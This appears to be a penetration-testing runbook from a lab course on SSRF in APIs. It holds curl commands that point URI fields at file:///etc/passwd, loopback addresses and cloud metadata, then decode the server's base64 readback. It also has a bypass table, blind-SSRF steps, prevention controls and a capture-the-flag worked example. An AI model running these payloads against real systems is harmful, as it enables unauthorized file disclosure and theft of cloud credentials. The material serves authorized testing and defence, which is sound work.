# Batch 07 — Server-Side Request Forgery (SSRF) (operator)

## FILL IN (any API)

```bash
BASE="https://api.example.com"
EMAIL="staff@example.com"; PASS="..."
LOGIN="/api/v1/authentication/.../sign-in"
# Fields that accept URL/URI/path and later get *fetched by the server*
URI_FIELD_CANDIDATES="photoUrl avatar webhook callback importUrl pdfUri fileURI PNGPhotoFileURI CertificateOfIncorporationPDFFileURI"
READBACK="/api/v1/.../photo-or-file"   # endpoint that returns content/base64 of that URI
```

## GOAL
Coerce the **server** to request a destination **you choose** (localhost, cloud metadata, internal HTTP, `file://`) and observe impact (data, port scan, RCE chain).

## TIME
1–2 hours

## YOU NEED
- OAS + one role that can set URL-like fields and trigger fetch  
- curl; optional collaborator / interactsh for blind SSRF  
- Authorized lab only for metadata/internal scans  

---

## WHY (first principles)

**SSRF (CWE-918)** = application builds an outbound (or local) request using **attacker-influenced location**, without a strict allowlist.

```text
You  --(set URL)-->  API  --(server fetches)-->  unexpected target
                              |
                              +--> response body / error / timing back to you
```

| Not SSRF | Is SSRF |
|----------|---------|
| Browser follows your link (open redirect) | **Server** fetches your URL |
| You download a file yourself | Server opens `file:///etc/passwd` for you |
| XSS in reflected URL | Backend HTTP client to `169.254.169.254` |

**API-shaped SSRF** often hides behind:

1. **Profile/product image by URL**  
2. **Webhook / callback registration**  
3. **Import from URL** (PDF, CSV, OpenAPI, sitemap)  
4. **Mass-assignable URI fields** that should be server-set only after upload  
5. **Preview / thumbnail / antivirus scan** that pulls the URI  

Two-phase pattern (this lab):

```text
WRITE path: PATCH/POST sets *FileURI / *Url  (no scheme allowlist)
READ path:  GET returns base64/bytes of whatever that URI points to
```

Related: **mass assignment** (you write a field you shouldn’t) + **SSRF** (server fetches it). File both when true.

---

## DO THIS (generic)

### 1) Map sinks (where does the server fetch?)

```bash
curl -sk -o openapi.json "$BASE/swagger/v1/swagger.json"
# Grep: Url, URI, webhook, callback, import, avatar, photo, certificate, fetch, download
```

Operator table:

| Endpoint | Field | When fetched? | Response channel |
|----------|-------|---------------|------------------|
| PATCH /… | photoUri | GET /…/photo | base64 body |
| POST /webhooks | url | event fire | blind / OOB |
| POST /import | sourceUrl | job worker | status + errors |

### 2) Auth + own a resource

```bash
JWT=$(curl -sk -X POST "$BASE$LOGIN" -H 'Content-Type: application/json' \
  -d "{\"Email\":\"$EMAIL\",\"Password\":\"$PASS\"}" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["jwt"])')
# Create product / company / profile you control
```

### 3) Set attacker URI (start local file / loopback)

```bash
# Local file (if client supports file://)
curl -sk -X PATCH "$BASE/api/v1/..." \
  -H "Authorization: Bearer $JWT" -H 'Content-Type: application/json' \
  -d '{"...":{"...URI":"file:///etc/passwd"}}'

# Loopback HTTP
# "http://127.0.0.1:80/"
# "http://localhost:6379/"

# Cloud metadata (authorized cloud labs only)
# "http://169.254.169.254/latest/meta-data/"
```

### 4) Trigger fetch / readback

```bash
curl -sk -H "Authorization: Bearer $JWT" "$BASE$READBACK" -o out.json
python3 -c 'import json,base64,sys;d=json.load(open("out.json"));
print(base64.b64decode(d.get("base64Data","")+ "==").decode("utf-8","replace")[:500])'
```

**SSRF if:** contents of local/internal resource appear, or internal service responds.

### 5) Blind SSRF (no body)

```bash
# Collaborator / interactsh URL in field; force event (save, preview, test webhook)
# Confirm DNS/HTTP hit from server egress IP
```

### 6) Operator log

```text
Write endpoint + field:
Read/trigger endpoint:
Payload URI:
Impact (file / metadata / internal):
Bypass attempts (if filtered):
```

---

## EDGE CASES / BYPASSES

| # | Test | Notes |
|---|------|--------|
| E1 | `file:///etc/passwd` | Local LFI-via-SSRF |
| E2 | `file:///etc/flag.conf` / appsettings / `.env` | Secrets |
| E3 | `http://127.0.0.1` / `http://[::1]` | Loopback |
| E4 | Decimal/hex IP, DNS rebinding | Filter bypass |
| E5 | Redirect to metadata | Follow-redirect SSRF |
| E6 | `gopher://` / `dict://` / `ftp://` | Protocol smuggling |
| E7 | URL with creds `http://user@internal` | |
| E8 | Partial allowlist `https://` only but open redirect on allowed host | |
| E9 | Mass-assign URI vs upload-only field | Policy fail |
| E10 | Different read endpoint than write (IDOR+SSRF) | Chain |
| E11 | Timing-only internal port scan | Blind |
| E12 | Huge `file://` → memory DoS | URC chain |

---

## GOTCHAS

| # | Gotcha | Fix |
|---|--------|-----|
| G1 | Testing only browser-side URL open | Confirm **server** issues request |
| G2 | Wrong JSON wrapper / field case → 400, not “not vuln” | Match OAS DTO exactly |
| G3 | Upload stores path; PATCH overwrites with `file://` | Test both write paths |
| G4 | Read requires different role / any JWT | Still SSRF if fetch happens |
| G5 | Base64 of binary garbage after prior huge file | Reset URI to small file |
| G6 | Calling it “LFI only” | Still CWE-918 if URI-controlled fetch |
| G7 | Production metadata probes without scope | Stay in authorized labs |

---

## Evidence comments (paste)

```text
Class: Server-Side Request Forgery (API7 / CWE-918).
Authenticated principal set field F on resource R to attacker URI U.
Server later retrieved U (file:// or internal http) and returned contents
via endpoint E (e.g. base64).
Impact: local file disclosure / internal network access / cloud credentials.
Often combined with mass assignment (client-writable URI that should be server-only).
```

## Prevention

| Control | Detail |
|---------|--------|
| Allowlist schemes + hosts | e.g. only `https://cdn.example.com/` |
| Block link-local / RFC1918 / metadata | At HTTP client layer |
| Never `file://` from user input | Server paths only after upload |
| Fixed storage root | Readback chrooted to `wwwroot/...` |
| Disable redirects or re-validate | |
| Network egress controls | SSRF-resistant architecture |
| Do not mass-assign URI fields | Server sets after validated upload |

## IF / THEN

| See | Do |
|-----|-----|
| `file://` returns passwd/flag | SSRF + local file disclosure |
| Metadata JSON | Critical cloud SSRF |
| Only DNS hit to collaborator | Blind SSRF |
| Can set fee + URI | Mass assign + SSRF separately |

## NEXT
→ [08-security-misconfiguration.md](./08-security-misconfiguration.md)  
→ Re-read [03-bopla-ede-mass-assignment.md](./03-bopla-ede-mass-assignment.md) when URI is mass-assignable  

---

## WORKED EXAMPLE (lab only — not the runbook)

Inlanefreight. Full proof: `../notes/inlanefreight-ssrf/`.

| Actor | Chain |
|-------|--------|
| **p10** (academy) | PATCH `CertificateOfIncorporationPDFFileURI=file:///etc/passwd` → GET `.../certificates-of-incorporation` base64 |
| **p11** (flag) | Create product → PATCH `PNGPhotoFileURI=file:///etc/flag.conf` → GET `/api/v1/products/{id}/photo` base64 |

**Flag contents of `/etc/flag.conf`:** see `notes/inlanefreight-ssrf/evidence/FLAGS.txt`
